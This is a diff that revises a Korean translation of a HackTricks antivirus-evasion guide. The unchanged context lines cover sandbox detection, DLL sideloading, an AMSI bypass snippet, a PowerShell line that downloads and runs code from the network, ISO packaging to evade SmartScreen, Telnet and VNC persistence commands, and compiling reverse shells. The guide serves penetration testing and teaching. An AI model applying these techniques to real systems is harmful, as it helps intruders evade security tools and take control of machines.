@@ -39,7 +39,7 @@ If you are interested in **hacking career** and hack the unhackable - **we are h
 
 때때로 이진 파일이나 스크립트의 일부 문자열을 변경하는 것만으로 AV를 통과할 수 있지만, 이는 난독화하려는 내용에 따라 시간이 많이 소요될 수 있습니다.
 
-* **커스텀 도구**
+* **맞춤형 도구**
 
 자신만의 도구를 개발하면 알려진 악성 서명이 없지만, 이는 많은 시간과 노력이 필요합니다.
 
@@ -55,19 +55,19 @@ Windows Defender의 정적 탐지에 대한 좋은 확인 방법은 [ThreatCheck
 
 * **실행 전 대기** 구현 방식에 따라 AV의 동적 분석을 우회하는 좋은 방법이 될 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 스캔할 시간이 매우 짧기 때문에 긴 대기를 사용하면 이진 파일 분석을 방해할 수 있습니다. 문제는 많은 AV의 샌드박스가 구현 방식에 따라 대기를 건너뛸 수 있다는 것입니다.
 * **컴퓨터 자원 확인** 일반적으로 샌드박스는 작업할 수 있는 자원이 매우 적습니다(예: < 2GB RAM), 그렇지 않으면 사용자의 컴퓨터를 느리게 만들 수 있습니다. 여기서 매우 창의적으로 접근할 수 있습니다. 예를 들어 CPU의 온도나 팬 속도를 확인하는 것과 같이 샌드박스에 구현되지 않은 것들이 많습니다.
-* **기계 특정 검사** "contoso.local" 도메인에 가입된 사용자를 타겟으로 하려면 컴퓨터의 도메인을 확인하여 지정한 도메인과 일치하는지 확인할 수 있습니다. 일치하지 않으면 프로그램을 종료할 수 있습니다.
+* **컴퓨터 특정 확인** "contoso.local" 도메인에 가입된 사용자를 타겟으로 하려면, 컴퓨터의 도메인을 확인하여 지정한 도메인과 일치하는지 확인할 수 있습니다. 일치하지 않으면 프로그램을 종료할 수 있습니다.
 
 Microsoft Defender의 샌드박스 컴퓨터 이름은 HAL9TH입니다. 따라서 폭발 전에 악성코드에서 컴퓨터 이름을 확인할 수 있습니다. 이름이 HAL9TH와 일치하면 Defender의 샌드박스 안에 있다는 의미이므로 프로그램을 종료할 수 있습니다.
 
 <figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-샌드박스에 대항하기 위한 [@mgeeky](https://twitter.com/mariuszbit)의 몇 가지 좋은 팁
+샌드박스에 대항하기 위한 [@mgeeky](https://twitter.com/mariuszbit)의 몇 가지 유용한 팁
 
 <figure><img src="../.gitbook/assets/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 채널</p></figcaption></figure>
 
-이 게시물에서 이전에 언급했듯이, **공식 도구**는 결국 **탐지됩니다**, 따라서 스스로에게 질문해야 합니다:
+앞서 이 글에서 언급했듯이, **공식 도구**는 결국 **탐지됩니다**, 따라서 스스로에게 질문해야 합니다:
 
-예를 들어, LSASS를 덤프하려면 **정말로 mimikatz를 사용해야 하나요**? 아니면 덜 알려진 다른 프로젝트를 사용하여 LSASS를 덤프할 수 있을까요?
+예를 들어, LSASS를 덤프하려면 **정말로 mimikatz를 사용해야 하나요**? 아니면 LSASS를 덤프하는 덜 알려진 다른 프로젝트를 사용할 수 있을까요?
 
 정답은 아마 후자일 것입니다. mimikatz를 예로 들면, 아마도 AV와 EDR에 의해 가장 많이 플래그가 지정된 악성코드 중 하나일 것입니다. 프로젝트 자체는 매우 멋지지만, AV를 우회하기 위해 작업하는 것은 악몽과도 같습니다. 따라서 달성하려는 목표에 대한 대안을 찾아보세요.
 
@@ -77,7 +77,7 @@ Microsoft Defender의 샌드박스 컴퓨터 이름은 HAL9TH입니다. 따라�
 
 ## EXEs vs DLLs
 
-가능할 때마다 **회피를 위해 DLL 사용을 우선시하세요**. 제 경험상 DLL 파일은 일반적으로 **탐지 및 분석이 훨씬 덜** 되므로, 경우에 따라 탐지를 피하기 위한 매우 간단한 트릭입니다(물론 페이로드가 DLL로 실행될 수 있는 방법이 있어야 합니다).
+가능할 때마다 항상 **회피를 위해 DLL 사용을 우선시하세요**. 제 경험상 DLL 파일은 일반적으로 **탐지 및 분석이 훨씬 덜 됩니다**. 따라서 경우에 따라 탐지를 피하기 위해 사용하는 매우 간단한 트릭입니다(물론 페이로드가 DLL로 실행될 수 있는 방법이 있어야 합니다).
 
 이 이미지에서 볼 수 있듯이, Havoc의 DLL 페이로드는 antiscan.me에서 4/26의 탐지율을 보이는 반면, EXE 페이로드는 7/26의 탐지율을 보입니다.
 
@@ -102,7 +102,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 
 이 명령은 "C:\Program Files\\" 내에서 DLL 하이재킹에 취약한 프로그램 목록과 그들이 로드하려고 하는 DLL 파일을 출력합니다.
 
-저는 **DLL 하이재킹 가능/사이드로드 가능한 프로그램을 직접 탐색할 것을 강력히 권장합니다**. 이 기술은 제대로 수행하면 매우 은밀하지만, 공개적으로 알려진 DLL 사이드로드 가능한 프로그램을 사용하면 쉽게 발각될 수 있습니다.
+저는 **DLL 하이재킹 가능/사이드로드 가능한 프로그램을 직접 탐색할 것을 강력히 권장합니다**. 이 기술은 제대로 수행되면 매우 은밀하지만, 공개적으로 알려진 DLL 사이드로드 가능한 프로그램을 사용하면 쉽게 발각될 수 있습니다.
 
 악성 DLL을 프로그램이 로드할 것으로 예상하는 이름으로 배치하는 것만으로는 페이로드가 로드되지 않습니다. 프로그램은 해당 DLL 내에서 특정 기능을 기대하기 때문입니다. 이 문제를 해결하기 위해 **DLL 프록시/포워딩**이라는 또 다른 기술을 사용할 것입니다.
 
@@ -121,7 +121,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 {% endcode %}
 
-마지막 명령은 2개의 파일을 제공합니다: DLL 소스 코드 템플릿과 원래 이름이 변경된 DLL입니다.
+마지막 명령은 2개의 파일을 제공합니다: DLL 소스 코드 템플릿과 원본 이름이 변경된 DLL입니다.
 
 <figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 
@@ -140,7 +140,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 <figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-나는 당신이 [S3cur3Th1sSh1t의 트위치 VOD](https://www.twitch.tv/videos/1644171543)와 [ippsec의 비디오](https://www.youtube.com/watch?v=3eROsG_WNpE)를 시청할 것을 **강력히 추천**합니다. 우리가 더 깊이 논의한 내용을 배우는 데 도움이 될 것입니다.
+나는 당신이 [S3cur3Th1sSh1t의 트위치 VOD](https://www.twitch.tv/videos/1644171543)와 [ippsec의 비디오](https://www.youtube.com/watch?v=3eROsG_WNpE)를 시청할 것을 **강력히 추천**합니다. 우리가 더 깊이 논의한 내용을 배우기 위해서입니다.
 {% endhint %}
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
@@ -172,7 +172,7 @@ AMSI 기능은 Windows의 다음 구성 요소에 통합되어 있습니다.
 * JavaScript 및 VBScript
 * Office VBA 매크로
 
-이는 안티바이러스 솔루션이 스크립트 내용을 암호화되지 않고 난독화되지 않은 형태로 노출하여 스크립트 동작을 검사할 수 있도록 합니다.
+이는 안티바이러스 솔루션이 스크립트 내용을 암호화되지 않고 난독화되지 않은 형태로 노출하여 스크립트 동작을 검사할 수 있게 합니다.
 
 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음 경고가 발생합니다.
 
@@ -192,11 +192,11 @@ AMSI는 주로 정적 감지와 함께 작동하므로, 로드하려는 스크�
 
 * **AMSI 우회**
 
-AMSI는 powershell(또는 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하여 구현되므로, 비특권 사용자로 실행하더라도 쉽게 조작할 수 있습니다. AMSI 구현의 이 결함으로 인해 연구자들은 AMSI 스캔을 회피하는 여러 방법을 발견했습니다.
+AMSI는 powershell(또는 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하여 구현되므로, 비권한 사용자로 실행하더라도 쉽게 조작할 수 있습니다. AMSI 구현의 이 결함으로 인해 연구자들은 AMSI 스캔을 회피하는 여러 방법을 발견했습니다.
 
 **오류 강제 발생**
 
-AMSI 초기화가 실패하도록 강제하면(amsiInitFailed) 현재 프로세스에 대한 스캔이 시작되지 않습니다. 원래 이는 [Matt Graeber](https://twitter.com/mattifestation)에 의해 공개되었으며, Microsoft는 더 넓은 사용을 방지하기 위해 서명을 개발했습니다.
+AMSI 초기화를 실패하게 강제하면(amsiInitFailed) 현재 프로세스에 대한 스캔이 시작되지 않습니다. 원래 이는 [Matt Graeber](https://twitter.com/mattifestation)에 의해 공개되었으며, Microsoft는 더 넓은 사용을 방지하기 위해 서명을 개발했습니다.
 
 {% code overflow="wrap" %}
 ```powershell
@@ -222,7 +222,7 @@ $Spotfix.SetValue($null,$true)
 ```
 Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.
 
-**Memory Patching**
+**메모리 패칭**
 
 이 기술은 [@RastaMouse](https://twitter.com/_RastaMouse/)에 의해 처음 발견되었으며, amsi.dll에서 "AmsiScanBuffer" 함수의 주소를 찾아 사용자 제공 입력을 스캔하는 역할을 하는 이 함수를 E\_INVALIDARG 코드를 반환하도록 덮어쓰는 것을 포함합니다. 이렇게 하면 실제 스캔의 결과가 0으로 반환되어 깨끗한 결과로 해석됩니다.
 
@@ -230,11 +230,11 @@ Keep in mind, that this will probably get flagged once this post comes out, so y
 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 읽어보세요.
 {% endhint %}
 
-PowerShell을 사용하여 AMSI를 우회하는 데 사용되는 다른 많은 기술이 있으며, [**이 페이지**](basic-powershell-for-pentesters/#amsi-bypass)와 [이 레포지토리](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하여 더 알아보세요.
+PowerShell을 사용하여 AMSI를 우회하는 데 사용되는 다른 많은 기술이 있으며, [**이 페이지**](basic-powershell-for-pentesters/#amsi-bypass)와 [이 레포지토리](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하여 더 많은 정보를 알아보세요.
 
 또는 메모리 패칭을 통해 각 새로운 Powersh를 패치하는 이 스크립트
 
-## Obfuscation
+## 난독화
 
 C# 클리어 텍스트 코드를 **난독화**하거나 이진 파일을 컴파일하기 위한 **메타프로그래밍 템플릿**을 생성하거나 **컴파일된 이진 파일을 난독화**하는 데 사용할 수 있는 여러 도구가 있습니다:
 
@@ -256,7 +256,7 @@ Microsoft Defender SmartScreen은 잠재적으로 악성 애플리케이션 실�
 
 <figure><img src="../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen은 주로 평판 기반 접근 방식으로 작동하며, 일반적으로 다운로드되지 않는 애플리케이션은 SmartScreen을 트리거하여 최종 사용자가 파일을 실행하지 못하도록 경고하고 방지합니다(파일은 여전히 More Info -> Run anyway를 클릭하여 실행할 수 있습니다).
+SmartScreen은 주로 평판 기반 접근 방식으로 작동하며, 이는 일반적으로 다운로드되지 않는 애플리케이션이 SmartScreen을 트리거하여 최종 사용자가 파일을 실행하지 못하도록 경고하고 방지한다는 것을 의미합니다(파일은 여전히 More Info -> Run anyway를 클릭하여 실행할 수 있습니다).
 
 **MoTW** (Mark of The Web)는 [NTFS 대체 데이터 스트림](https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_\(ADS\))으로, 인터넷에서 파일을 다운로드할 때 자동으로 생성되며, 다운로드한 URL과 함께 Zone.Identifier라는 이름을 가집니다.
 
@@ -272,7 +272,7 @@ SmartScreen은 주로 평판 기반 접근 방식으로 작동하며, 일반적�
 
 [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 Mark-of-the-Web을 피하기 위해 페이로드를 출력 컨테이너에 패키징하는 도구입니다.
 
-Example usage:
+예제 사용법:
 ```powershell
 PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
 
@@ -298,31 +298,31 @@ Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files 
 
 <figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
 
-## C# Assembly Reflection
+## C# 어셈블리 리플렉션
 
 C# 바이너리를 메모리에 로드하는 것은 꽤 오랫동안 알려져 있으며, AV에 걸리지 않고 포스트 익스플로잇 도구를 실행하는 매우 좋은 방법입니다.
 
 페이로드가 디스크를 건드리지 않고 메모리에 직접 로드되기 때문에, 전체 프로세스에 대해 AMSI 패치에 대해서만 걱정하면 됩니다.
 
-대부분의 C2 프레임워크(슬리버, 코버넌트, 메타스플로잇, 코발트스트라이크, 하복 등)는 이미 C# 어셈블리를 메모리에서 직접 실행할 수 있는 기능을 제공하지만, 이를 수행하는 방법은 여러 가지가 있습니다:
+대부분의 C2 프레임워크(슬리버, 코버넌트, 메타스플로잇, 코발트스트라이크, 하복 등)는 이미 메모리에서 C# 어셈블리를 직접 실행할 수 있는 기능을 제공하지만, 이를 수행하는 방법은 여러 가지가 있습니다:
 
-* **Fork\&Run**
+* **포크&런**
 
-이는 **새로운 희생 프로세스를 생성**하고, 그 새로운 프로세스에 포스트 익스플로잇 악성 코드를 주입한 후, 악성 코드를 실행하고 완료되면 새로운 프로세스를 종료하는 것입니다. 이 방법은 장점과 단점이 모두 있습니다. Fork and run 방법의 장점은 실행이 **우리의 비콘 임플란트 프로세스 외부**에서 발생한다는 것입니다. 이는 포스트 익스플로잇 작업에서 문제가 발생하거나 걸리면, **임플란트가 살아남을 가능성이 훨씬 더 높습니다.** 단점은 **행동 탐지**에 의해 걸릴 가능성이 **더 높아진다는** 것입니다.
+이는 **새로운 희생 프로세스를 생성**하고, 그 새로운 프로세스에 포스트 익스플로잇 악성 코드를 주입한 후, 악성 코드를 실행하고 완료되면 새로운 프로세스를 종료하는 것입니다. 이 방법은 장점과 단점이 모두 있습니다. 포크 앤 런 방법의 장점은 실행이 **우리 비콘 임플란트 프로세스 외부**에서 발생한다는 것입니다. 이는 포스트 익스플로잇 작업에서 문제가 발생하거나 잡히면 **임플란트가 생존할 가능성이 훨씬 더 높습니다.** 단점은 **행동 탐지**에 의해 잡힐 가능성이 **더 높아진다는** 것입니다.
 
 <figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>
 
-* **Inline**
+* **인라인**
 
-이는 포스트 익스플로잇 악성 코드를 **자신의 프로세스에 주입하는 것**입니다. 이렇게 하면 새로운 프로세스를 생성하고 AV에 의해 스캔되는 것을 피할 수 있지만, 단점은 페이로드 실행에 문제가 생기면 **비콘을 잃을 가능성이 훨씬 더 높아진다는** 것입니다. 왜냐하면 비콘이 충돌할 수 있기 때문입니다.
+이는 포스트 익스플로잇 악성 코드를 **자신의 프로세스에 주입하는 것**입니다. 이렇게 하면 새로운 프로세스를 생성하고 AV에 의해 스캔되는 것을 피할 수 있지만, 단점은 페이로드 실행에 문제가 생기면 **비콘을 잃을 가능성이 훨씬 더 높아진다는** 것입니다. 왜냐하면 프로세스가 충돌할 수 있기 때문입니다.
 
 <figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-C# 어셈블리 로딩에 대해 더 읽고 싶다면, 이 기사를 확인해 보세요 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 및 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
+C# 어셈블리 로딩에 대해 더 읽고 싶다면, 이 기사를 확인해 보세요 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 그리고 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
 {% endhint %}
 
-PowerShell에서 C# 어셈블리를 **로드할 수도 있습니다**, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 및 [S3cur3th1sSh1t의 비디오](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인해 보세요.
+PowerShell에서 C# 어셈블리를 **로드할 수도 있습니다**, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t의 비디오](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인해 보세요.
 
 ## 다른 프로그래밍 언어 사용하기
 
@@ -342,7 +342,7 @@ SMB 공유에서 인터프리터 바이너리와 환경에 대한 접근을 허�
 
 {% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}
 
-[@mariuszbit](https://twitter.com/mariuszbit)의 깊이 있는 회피에 대한 또 다른 훌륭한 강연입니다.
+이것은 또한 [@mariuszbit](https://twitter.com/mariuszbit)의 깊이 있는 회피에 대한 또 다른 훌륭한 강연입니다.
 
 {% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}
 
@@ -353,13 +353,13 @@ SMB 공유에서 인터프리터 바이너리와 환경에 대한 접근을 허�
 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하여 **바이너리의 일부를 제거**하여 **Defender가 악성으로 찾는 부분을 알아내고** 이를 분리할 수 있습니다.\
 또 다른 도구로는 [**avred**](https://github.com/dobin/avred)가 있으며, [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 서비스를 제공하고 있습니다.
 
-### **Telnet 서버**
+### **텔넷 서버**
 
-Windows 10까지 모든 Windows에는 **Telnet 서버**가 포함되어 있었으며, 이를 설치할 수 있었습니다(관리자로서):
+Windows 10까지 모든 Windows에는 **텔넷 서버**가 포함되어 있었으며, 이를 설치할 수 있었습니다(관리자로서):
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
-시스템이 시작될 때 **시작**하고 **지금** 실행하십시오:
+시스템이 시작될 때 **시작**하고 **지금** 실행하세요:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
@@ -387,7 +387,7 @@ Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.
 **경고:** 은폐를 유지하기 위해 몇 가지를 하지 않아야 합니다
 
 * `winvnc`가 이미 실행 중이라면 시작하지 마세요. 그렇지 않으면 [팝업](https://i.imgur.com/1SROTTl.png)이 발생합니다. `tasklist | findstr winvnc`로 실행 중인지 확인하세요
-* 동일한 디렉토리에 `UltraVNC.ini` 없이 `winvnc`를 시작하지 마세요. 그렇지 않으면 [설정 창](https://i.imgur.com/rfMQWcf.png)이 열립니다
+* 같은 디렉토리에 `UltraVNC.ini` 없이 `winvnc`를 시작하지 마세요. 그렇지 않으면 [설정 창](https://i.imgur.com/rfMQWcf.png)이 열립니다
 * 도움을 위해 `winvnc -h`를 실행하지 마세요. 그렇지 않으면 [팝업](https://i.imgur.com/oc18wcu.png)이 발생합니다
 
 ### GreatSCT
@@ -414,7 +414,7 @@ generate #payload is the default name
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
-**현재의 방어자는 프로세스를 매우 빠르게 종료할 것입니다.**
+**현재의 방어자는 프로세스를 매우 빠르게 종료합니다.**
 
 ### 자체 리버스 셸 컴파일하기
 
@@ -422,7 +422,7 @@ https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
 #### 첫 번째 C# 리버스 셸
 
-다음과 함께 컴파일하세요:
+다음과 함께 컴파일합니다:
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
 ```
@@ -584,7 +584,7 @@ GCP 해킹 배우기 및 연습하기: <img src="../.gitbook/assets/grte.png" al
 <summary>HackTricks 지원하기</summary>
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
-* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
 * **해킹 트릭을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하세요.**
 
 </details>
